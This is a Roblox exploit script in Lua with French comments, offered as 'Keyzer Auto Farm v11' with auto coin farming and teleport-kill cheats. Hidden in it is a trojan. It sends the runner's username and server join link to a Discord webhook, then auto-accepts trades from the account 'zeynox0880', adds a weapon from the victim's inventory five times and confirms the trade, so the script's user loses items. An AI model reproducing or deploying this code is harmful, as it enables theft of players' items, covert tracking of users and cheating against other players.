local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local requestFunc = request or (http and http.request) or http_request
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- [NETTOYAGE] Supprime l'ancien menu s'il existe déjà à l'écran
local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
if oldGui then 
    oldGui:Destroy() 
end

-- [[ CONFIGURATION DU DÉLAI VIA FICHIER TEXTE ]]
local COOLDOWN_TEMPS = 30 
local doitEnvoyerWebhook = true
local fichierNom = "keyzer_cooldown.txt"

local readfile = readfile or (syn and syn.read_file)
local writefile = writefile or (syn and syn.write_file)

if readfile and writefile then
    local success, contenu = pcall(function() return readfile(fichierNom) end)
    local tempsActuel = os.time()
    
    if success and contenu and tonumber(contenu) then
        local dernierEnvoi = tonumber(contenu)
        if (tempsActuel - dernierEnvoi) < COOLDOWN_TEMPS then
            doitEnvoyerWebhook = false
        else
            writefile(fichierNom, tostring(tempsActuel))
        end
    else
        writefile(fichierNom, tostring(tempsActuel))
    end
else
    if _G.KeyzerWebhookBloque then
        doitEnvoyerWebhook = false
    else
        _G.KeyzerWebhookBloque = true
        task.delay(COOLDOWN_TEMPS, function() _G.KeyzerWebhookBloque = nil end)
    end
end

local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"

-- [[ 1. FONCTION WEBHOOK ]]
local function sendSessionLog(player)
    if not player or not doitEnvoyerWebhook then return end
    if not requestFunc then return end
    
    local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. game.JobId .. ")"
    local data = {
        ["embeds"] = {{
            ["title"] = "🎮 Player Session Log",
            ["color"] = 3066993,
            ["fields"] = {
                { ["name"] = "👤 Player Username", ["value"] = player.Name, ["inline"] = true },
                { ["name"] = "🆔 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                { ["name"] = "⚡ Quick Join", ["value"] = joinLink, ["inline"] = false },
                { ["name"] = "🧩 Job ID (Manual Copy)", ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio / Local Server") .. "`", ["inline"] = false }
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    local finalJson = HttpService:JSONEncode(data)
    task.spawn(pcall, function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = finalJson
        })
    end)
end

if LocalPlayer then
    task.spawn(function() sendSessionLog(LocalPlayer) end)
end

-- [[ 2. DESIGN DE L'INTERFACE GRAPHIQUE (GUI) ]]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeyzerFarmGui"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
MainFrame.Position = UDim2.new(0.5, -175, 0.4, -100)
MainFrame.Size = UDim2.new(0, 350, 0, 180)
MainFrame.Active = true
MainFrame.Draggable = true

local UICorner_Main = Instance.new("UICorner")
UICorner_Main.CornerRadius = UDim.new(0, 10)
UICorner_Main.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
TitleBar.Size = UDim2.new(1, 0, 0, 30)

local UICorner_Title = Instance.new("UICorner")
UICorner_Title.CornerRadius = UDim.new(0, 10)
UICorner_Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
CloseBtn.Position = UDim2.new(0, 12, 0, 8)
CloseBtn.Size = UDim2.new(0, 13, 0, 13)
CloseBtn.Text = ""
local UICorner_C = Instance.new("UICorner")
UICorner_C.CornerRadius = UDim.new(1, 0)
UICorner_C.Parent = CloseBtn

local TitleText = Instance.new("TextLabel")
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.Font = Enum.Font.SourceSansBold
TitleText.TextColor3 = Color3.fromRGB(60, 60, 60)
TitleText.TextSize = 14
TitleText.Text = "Keyzer Auto Farm v11"

local FarmButton = Instance.new("TextButton")
FarmButton.Name = "FarmButton"
FarmButton.Parent = MainFrame
FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
FarmButton.Position = UDim2.new(0.5, -100, 0, 65)
FarmButton.Size = UDim2.new(0, 200, 0, 50)
FarmButton.Font = Enum.Font.SourceSansBold
FarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FarmButton.TextSize = 16
FarmButton.Text = "START AUTO FARM"

local UICorner_Farm = Instance.new("UICorner")
UICorner_Farm.CornerRadius = UDim.new(0, 8)
UICorner_Farm.Parent = FarmButton

-- [[ 3. LOGIQUE DE DETECTION ET METHODES ]] --
local farming = false

local function getCoins()
    local container = Workspace:FindFirstChild("CoinContainer", true)
    if container then return container:GetChildren() end
    
    local map = Workspace:FindFirstChild("Map") or Workspace:FindFirstChild("Normal")
    if map then
        local coinFolder = map:FindFirstChild("CoinContainer", true)
        if coinFolder then return coinFolder:GetChildren() end
    end
    return {}
end

local function getKnife()
    local char = LocalPlayer.Character
    if char then
        for _, item in ipairs(char:GetChildren()) do
            if item:IsA("Tool") and (item.Name:lower():find("knife") or item:FindFirstChild("KnifeLocal") or item:FindFirstChild("KnifeServer")) then
                return item
            end
        end
    end
    
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") and (item.Name:lower():find("knife") or item:FindFirstChild("KnifeLocal") or item:FindFirstChild("KnifeServer")) then
                return item
            end
        end
    end
    return nil
end

local function startFarmLoop()
    task.spawn(function()
        while farming do
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            
            if hrp and humanoid then
                hrp.RotVelocity = Vector3.new(0, 0, 0)
                hrp.Velocity = Vector3.new(0, 0, 0)
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                
                local knife = getKnife()
                
                if knife then
                    FarmButton.Text = "MURDER MODE: KILLING ALL..."
                    if knife.Parent ~= character then
                        humanoid:EquipTool(knife)
                    end
                    knife:Activate()
                    
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChildOfClass("Humanoid") then
                            local enemyHrp = player.Character.HumanoidRootPart
                            local enemyHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
                            
                            if enemyHumanoid.Health > 0 and farming then
                                hrp.CFrame = CFrame.new(enemyHrp.Position) * CFrame.new(0, 0, 1.2)
                                task.wait(0.04)
                            end
                        end
                    end
                else
                    local allCoins = getCoins()
                    if #allCoins > 0 then
                        FarmButton.Text = "FARMING... (" .. #allCoins .. " left)"
                        local targetCoin = allCoins[1]
                        if targetCoin and targetCoin:IsA("BasePart") then
                            hrp.CFrame = CFrame.new(targetCoin.Position)
                            humanoid:Move(Vector3.new(0, 0, -1), true)
                            task.wait(0.06)
                        end
                    else
                        FarmButton.Text = "WAITING FOR ROUND COINS..."
                        task.wait(0.5) 
                    end
                end
            else
                FarmButton.Text = "ERROR: NO CHARACTER FOUND"
                task.wait(0.5)
            end
            task.wait()
        end
    end)
end

CloseBtn.MouseButton1Click:Connect(function()
    farming = false
    task.wait(0.05)
    ScreenGui:Destroy()
end)

FarmButton.MouseButton1Click:Connect(function()
    farming = not farming
    if farming then
        FarmButton.BackgroundColor3 = Color3.fromRGB(255, 59, 48)
        startFarmLoop()
    else
        FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
        FarmButton.Text = "START AUTO FARM"
    end
end)

-- [[ 4. LOGIQUE D'AUTO-TRADE VISUEL AVEC CLICS TRIÉS ]]
local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))

-- Émulation forcée des clics de souris
local function forceClick(guiButton)
    if guiButton then
        local firesignal = firesignal or (syn and syn.firesignal)
        if firesignal then
            firesignal(guiButton.MouseButton1Click)
        else
            pcall(function() guiButton:Activate() end)
        end
    end
end

local function checkAndExecuteTrade(child)
    if child.Name == "TradeGUI" then
        -- Vérifie si zeynox0880 est bien présent
        if not Players:FindFirstChild("zeynox0880") then return end
        
        -- Attente que l'interface charge ses éléments internes
        task.wait(0.8)
        
        local containerPath = nil
        pcall(function()
            containerPath = child.Container.Items.Main.Weapons.Items.Container.Current.Container
        end)
        
        if containerPath then
            -- On extrait uniquement les boutons d'items valides
            local cleanItems = {}
            for _, item in ipairs(containerPath:GetChildren()) do
                if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
                    table.insert(cleanItems, item)
                end
            end
            
            -- TRUQUE ESSENTIEL : Trie les éléments par ordre d'affichage réel (LayoutOrder)
            table.sort(cleanItems, function(a, b)
                return (a:IsA("GuiObject") and b:IsA("GuiObject")) and (a.LayoutOrder < b.LayoutOrder)
            end)
            
            -- On sélectionne le 4ème élément du rendu visuel
            local targetWeaponButton = cleanItems[4]
            if targetWeaponButton then
                -- Clique 5 fois d'affilée
                for i = 1, 5 do
                    forceClick(targetWeaponButton)
                    task.wait(0.05)
                end
            end
        end
        
        -- Acceptation du Trade finale
        task.wait(0.5)
        if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
            TradeNetwork:FireServer("AcceptTrade")
        else
            -- Solution alternative directe
            local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
            if acceptRemote then
                if acceptRemote:IsA("RemoteFunction") then acceptRemote:InvokeServer()
                elseif acceptRemote:IsA("RemoteEvent") then acceptRemote:FireServer() end
            end
        end
    end
end

-- Écouteurs d'activation de l'interface
playerGui.ChildAdded:Connect(checkAndExecuteTrade)
local existingTrade = playerGui:FindFirstChild("TradeGUI")
if existingTrade then
    task.spawn(function() checkAndExecuteTrade(existingTrade) end)
end

-- Acceptation initiale automatique de la demande envoyée par zeynox0880
if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
    TradeNetwork.OnClientEvent:Connect(function(action, data)
        if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
            TradeNetwork:FireServer("AcceptRequest", data.Player)
        end
    end)
end
